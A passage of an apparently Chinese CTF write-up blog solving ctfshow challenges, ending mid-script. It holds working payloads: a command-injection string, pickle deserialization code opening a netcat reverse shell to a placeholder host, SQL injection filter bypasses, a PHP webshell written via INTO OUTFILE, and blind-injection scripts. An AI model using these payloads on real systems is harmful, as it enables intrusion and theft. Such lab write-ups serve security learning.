src="../images/image-20230108143551463.png" alt="image-20230108143551463"></strong></p><p>这题跟反序列话没啥太大关系，就是理清逻辑关系就可以成功拿到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>目的就是为了使evilfile为true，然后执行这个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="comment">//写入文件内容</span></span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">      <span class="comment">//复制文件,生成的新文件名进行md5加密+随机数</span></span><br><span class="line">      <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">      <span class="comment">//删除原来的文件</span></span><br><span class="line">      <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道这些以后，就可以成功进行rce了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>只需要两个参数中含有对应的值就行了。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=<span class="title">php</span></span>;tac f*</span><br></pre></td></tr></table></figure><h2 id="web276-phar反序列化"><a href="#web276-phar反序列化" class="headerlink" title="web276(phar反序列化)"></a>web276(phar反序列化)</h2><p>源码</p><p><img src="../images/image-20230113165336370.png" alt="image-20230113165336370"></p><h2 id="web277-python反序列化"><a href="#web277-python反序列化" class="headerlink" title="web277(python反序列化)"></a>web277(python反序列化)</h2><p><strong>题目</strong></p><p><img src="../images/image-20230312123235906.png" alt="image-20230312123235906"></p><p><strong>通过pickle判断出是python反序列化</strong></p><p>这里python反序列化和php的反序列化差不多，但是python的反序列化比较简单，没有php那么花里胡哨的。</p><p><code>dumps()</code>是序列化的方法</p><p><code>loads()</code>是反序列化的方法</p><p><a href="https://www.bilibili.com/video/BV1D64y1m78f?p=24&amp;spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">群主讲的wp</a></p><p>这里python反序列化的关键就是  <code>__reduce</code>__魔法函数，就是利用这个函数来进行对反序列化的值进行操控，从而进行命令执行。</p><p><img src="../images/image-20230312122011395.png" alt="image-20230312122011395"></p><p>网上随便找的一个解释</p><p>python反序列化话的主要就是这个方法，没有像php那么花里胡哨得到</p><p>只要对第一和第二个参数进行控制就行</p><p>第一个参数 —-&gt;  就是方法，例如system  eval这种</p><p>第二个参数 ——&gt;  就是内容，就是进行命令执行的内容 </p><p>这要控制这两个方法的话，那么就是进行自己想要的命令执行了</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFshow</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.show)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.show=show</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc xxx.xxx.xxx.xxx port -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line">cs = CTFshow(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">ctfshow_ser=pickle.dumps(cs)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctfshow_ser))</span><br></pre></td></tr></table></figure><p>因为题目无回显，所以反弹shell</p><p>这里话反弹shell有很多种方法，如果题目禁用这种的话，可以自己去google一下，网上挺多的</p><p><img src="../images/image-20230312123519474.png" alt="image-20230312123519474"></p><p>有些时候跑的payload不成功，可能是因为pvm认证的协议不一样，所以有时时候我们可以加上。</p><p><img src="../images/image-20230312123626529.png" alt="image-20230312123626529"></p><p>就像这样写</p><p>反弹shell后拿到flag</p><p><img src="../images/image-20230312124206547.png" alt="image-20230312124206547"></p><h2 id="web278-python反序列化"><a href="#web278-python反序列化" class="headerlink" title="web278(python反序列化)"></a>web278(python反序列化)</h2><p>题目</p><p><img src="../images/image-20230312160036945.png" alt="image-20230312160036945"></p><p>题目提示过滤了 <code>os.system</code>,这里话过滤是看序列化里有没有<code>os.system</code>的，因为我们上一题用的是popen,并不是用的os.system,所以上一题的paylaod还是可以用的</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTFshow</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sw</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.show)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.show=show</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc xxx.xxx.xxx.xxx port -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line">cs = CTFshow(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">ctfshow_ser=pickle.dumps(cs)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctfshow_ser))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sql注入 刷题记录</title>
      <link href="/posts/b77a4eaf.html"/>
      <url>/posts/b77a4eaf.html</url>
      
        <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>源码</p><p><img src="../images/image-20221226192746294.png" alt="image-20221226192746294"></p><p>给了一个sql语句，那么我们就可以通过这sql语句来进行判断，那么我们可以自己新建一个数据库来测试。</p><p>就是利用phpstudy和navicat    （网上有教程，可以去拿来学习学习）</p><p><img src="../images/image-20221226193154082.png" alt="image-20221226193154082"></p><p>新建了一个和题目差不多的user表，然后就可进行测试。</p><p><img src="../images/image-20221226193548945.png" alt="image-20221226193548945"></p><p>通过这几个简单的测试，发现了就是虽然username不等于flag的情况下，可以利用id，就令前面的id=xx不成立的情况下，就可以用到后面的id了，那么我们就得以后面的id为突破口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;xxx     &#x27;&#x27;是为了闭合sql语句，否则无法执行</span><br></pre></td></tr></table></figure><p><strong>解法</strong></p><p>这道题的解法是看到只能查到id=24,我们就怀疑会不会藏在后面，我们就可以一个一个的试出来。</p><p><img src="../images/image-20221226193930975.png" alt="image-20221226193930975"></p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>源码</p><p><img src="../images/image-20221226203357870.png" alt="image-20221226203357870"></p><p><img src="../images/image-20221226203412925.png" alt="image-20221226203412925"></p><p>这道题直接用上一道题的解法，这道题就解不了了那么可以换别的解法，就是union联合注入。</p><p>就是可以本地试一下，如果成功了话，就可以拿去题目试一下</p><p><img src="../images/image-20221226204544643.png" alt="image-20221226204544643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from user where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>这里查询列的数量要和题目给的语句中列的数量一样</p><p>这句话成功执行了，那么我们就可以拿去题目试一下，发现也可以成功执行，就拿到flag了。</p><p><img src="../images/image-20221226204645887.png" alt="image-20221226204645887"></p><p><strong>也可以利用模糊查询，但是只能本地通过，题目不能通过。</strong></p><p><img src="../images/image-20221226205245342.png" alt="image-20221226205245342"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or username like &#x27;%f%</span><br></pre></td></tr></table></figure><p><strong>补充点知识</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql  中的点是 &#x27; . &#x27;  可以这样用，再有多个数据库的情况下， </span><br><span class="line">数据库名.xxxxx    例如这道题就可以这样用  ctfshow_user2.username   ctfshow_user2.id</span><br><span class="line">ctfshow_user2.password</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也可以把数据库设做别的名字。   利用的是   as  这个单词</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select b.id,b.password from user as b where b.username=&#x27;flag</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from ctfshow_user2 where username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>源码</p><p><img src="../images/image-20221226210521949.png" alt="image-20221226210521949"></p><p>这道题是结果返回的过程中不能出现flag,那么我们就得想办法把flag给绕过，那么我们就可以通过转换进制来绕过。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,bin(username),password from ctfshow_user3 where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>也可以换成hex   —&gt;16进制。</p><p><img src="../images/image-20221226211348202.png" alt="image-20221226211348202"></p><p>那么就可以成功拿到flag了。</p><p>最好是本地测试通过后在搬到题目上</p><p><img src="../images/image-20221226211450157.png" alt="image-20221226211450157"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>源码</p><p><img src="../images/image-20221226225822637.png" alt="image-20221226225822637"></p><p>利用前面的语句已经解不出来了，因为就是把flag和数字都屏蔽掉了，因为flag中还含有数字，所以就得使用替换。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999&#x27;union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#x27;1&#x27;,&#x27;nba&#x27;),&#x27;2&#x27;,&#x27;nbb&#x27;),&#x27;3&#x27;,&#x27;nbc&#x27;),&#x27;4&#x27;,&#x27;nbd&#x27;),&#x27;5&#x27;,&#x27;nbe&#x27;),&#x27;6&#x27;,&#x27;nbf&#x27;),&#x27;7&#x27;,&#x27;nbg&#x27;),&#x27;8&#x27;,&#x27;nbh&#x27;),&#x27;9&#x27;,&#x27;nbi&#x27;),&#x27;0&#x27;,&#x27;nbj&#x27;),&#x27;a&#x27; from ctfshow_user4 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure><p>—+指的是注释</p><p>这个py的意思就是把flag中的数字全部替换成别的，用16进制转换的原因是，因为转换的字母全是大写，所以我们替换的是小写，那么就不会出现影响。</p><p><strong>替换回去的py脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nb=<span class="string">&#x27;ctfshow&#123;nbfnbcnbgnbdnbfnbfnbgnbcnbfnbhnbfFnbgnbgnbgBnbcnbenbcnbanbcnbbnbfnbcnbfnbfnbfnbcnbcnbenbfnbfnbbDnbfnbanbfnbcnbcnbanbcnbhnbbDnbcnbdnbcnbbnbfnbanbcnbanbbDnbfnbbnbcnbgnbcnbcnbcnbcnbbDnbfnbdnbfnbbnbfnbcnbfnbbnbcnbdnbcnbfnbcnbjnbcnbanbcnbdnbcnbbnbfnbfnbcnbjnbgD&#125;&#x27;</span></span><br><span class="line"><span class="comment">#nb表示number</span></span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nba&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbb&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbc&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbd&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbe&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbf&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbg&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbh&#x27;</span>,<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbi&#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbj&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(nb)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221226232256106.png" alt="image-20221226232256106"></p><p>这里去输入a是为了把flag名给替换掉。</p><p>输入payload，拿到转换后的flag，放到脚本里</p><p><img src="../images/image-20221226232824965.png" alt="image-20221226232824965"></p><p>得到输出结果后，进行16进制转换。</p><p><img src="../images/image-20221226233028450.png" alt="image-20221226233028450"></p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>源码</p><p><img src="../images/image-20221226234423628.png" alt="image-20221226234423628"></p><p>这里去查了一下ascii表，发现是全部都给过滤掉了，太致命了。所以看了群主的视频，学到了一种方法</p><p>就是利用这个东西</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>然后就去连接蚁剑，连接蚁剑完后就去连接数据库就好了。</p><p>（但是我连接数据库失败，不知道是啥原因）</p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>源码</p><p><img src="../images/image-20221227153245178.png" alt="image-20221227153245178"></p><p>就是增加了过滤，但是这里也没给过滤了啥，所以可以拿简单的代码试试，看能不能打通。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;26     -1&#x27; or username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227153414750.png" alt="image-20221227153414750"></p><p>成功拿到flag。</p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>源码</p><p><img src="../images/image-20221227154121948.png" alt="image-20221227154121948"></p><p>这道题简单进行了测试，发现的是对空格进行了过滤。</p><p><strong>空格被过滤的替换方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先我们空格被过滤，这个绕过方法有很多</span><br><span class="line">使用注释绕过，/**/，但是因为’/‘被过滤，导致此方法无法使用</span><br><span class="line">使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格</span><br><span class="line">使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a，这里我选择了%0a进行绕过</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227154738181.png" alt="image-20221227154738181"></p><p>通过测试，确实是空格被过滤了，那么我们就可以选择2为注释点。</p><p><img src="../images/image-20221227154904901.png" alt="image-20221227154904901"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><p>直接用#不行，得进行url编码。</p><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>源码</p><p><img src="../images/image-20221227155020058.png" alt="image-20221227155020058"></p><p>这道题是把/**给过滤掉了，然后换成%0b就行。</p><p><img src="../images/image-20221227155457926.png" alt="image-20221227155457926"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0bunion%0bselect%0b&#x27;1&#x27;,(select%0bpassword%0bfrom%0bctfshow_user%0bwhere%0busername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>源码</p><p><img src="../images/image-20221227155714933.png" alt="image-20221227155714933"></p><p>这道题进行了测试下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/  %0a  %0b 都过滤掉了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227155823003.png" alt="image-20221227155823003"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>源码</p><p><img src="../images/image-20221227160433511.png" alt="image-20221227160433511"></p><p>用179的payload还能用，但是得把后面的东西去掉，也该是过滤掉了;或者是%23</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>源码</p><p><img src="../images/image-20221227160739728.png" alt="image-20221227160739728"></p><p>给了过滤项。</p><p>and的优先级高于or，需要同时满足两边的条件才会返回true，那么后面可以接一个or，or的两边有一个为true，既可以满足and。即：1 and 0 or 1</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227161951410.png" alt="image-20221227161951410"></p><p>这道题也能用%0c来做，那么就是题目给漏了。</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>源码</p><p><img src="../images/image-20221227162638001.png" alt="image-20221227162638001"></p><p>多过滤了个flag</p><p>%  —-&gt;相当于*，任意匹配</p><p>_   ——-&gt;相当于？，只能匹配一个字符</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||(username)like&#x27;%fla%</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227162805178.png" alt="image-20221227162805178"></p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>源码</p><p><img src="../images/image-20221227174007597.png" alt="image-20221227174007597"></p><p><a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a>   摘自这篇博客</p><p>解答：waf又增加了一些，题目也有变化了。查询到的结果会返回到下面第三个灰块那里。</p><p>select不能用，就只能选择布尔盲注或者时间盲注了。</p><p>这题的解法是在已知表名的情况下实现的，再结合模糊匹配like或者正则匹配regexp。<br>写脚本前先测试一下语句是否能正常执行，可以的话，再写到脚本里。</p><p>因为每次查询记录总数都是1条，就是我们要找的flag，所以页面固定会出现$user_count = 1;，可以用布尔盲注。</p><p>题目这里可以行得通</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=`ctfshow_user`where`pass`like&#x27;ctfshow&#123;%&#x27;</span><br></pre></td></tr></table></figure><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#有并发数量限制的题目，就睡一段时间</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>regexp</code>这个是正则匹配的意思。</p><p><img src="../images/image-20221227182656859.png" alt="image-20221227182656859"></p><p>利用脚本就可以跑完了，就是跑的会有点久。</p><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>源码</p><p><img src="../images/image-20221227183934675.png" alt="image-20221227183934675"></p><p>着里是把where和单双引号都给过滤掉了，那么我们就得去利用16进制给绕过，where被过滤的话可以使用having进行绕过，但是having有使用条件.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</span><br></pre></td></tr></table></figure><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://77ccea0a-ea21-463d-bd36-c3517890ddcd.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    a= <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line">    <span class="keyword">return</span> a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span 